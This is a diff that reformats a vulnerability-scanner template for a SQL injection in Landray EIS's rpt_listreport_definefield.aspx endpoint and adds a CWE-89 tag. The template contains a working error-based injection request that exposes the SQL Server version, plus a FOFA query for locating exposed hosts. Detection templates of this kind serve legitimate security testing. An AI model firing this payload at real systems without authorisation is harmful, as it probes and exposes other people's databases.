@@ -1,5 +1,4 @@
 id: landray-eis-sqli
-
 info:
   name: Landray EIS - SQL Injection
   author: DhiyaneshDK
@@ -9,24 +8,23 @@ info:
   reference:
     - https://github.com/wy876/POC/blob/main/%E8%93%9D%E5%87%8CEIS%E6%99%BA%E6%85%A7%E5%8D%8F%E5%90%8C%E5%B9%B3%E5%8F%B0rpt_listreport_definefield.aspx%E6%8E%A5%E5%8F%A3%E5%AD%98%E5%9C%A8SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E.md?plain=1
   classification:
+    cwe-id:
+      - CWE-89
     cpe: cpe:2.3:a:landray:landray_office_automation:*:*:*:*:*:*:*:*
   metadata:
-    verified: true
-    max-request: 1
-    vendor: landray
-    product: landray_office_automation
     fofa-query: app="Landray-OA系统"
-  tags: landray,eims,sqli,vuln
-
+    max-request: 1
+    product: landray_office_automation
+    vendor: landray
+    verified: true
+  tags: eims,landray,sqli,vuln
 http:
-  - method: GET
-    path:
-      - "{{BaseURL}}/SM/rpt_listreport_definefield.aspx?ID=2%20and%201=@@version--+"
-
-    matchers:
-      - type: word
+  - matchers:
+      - condition: and
+        type: word
         words:
-          - "Microsoft SQL Server"
-          - "SqlException"
-        condition: and
-
+          - Microsoft SQL Server
+          - SqlException
+    method: GET
+    path:
+      - '{{BaseURL}}/SM/rpt_listreport_definefield.aspx?ID=2%20and%201=@@version--+'
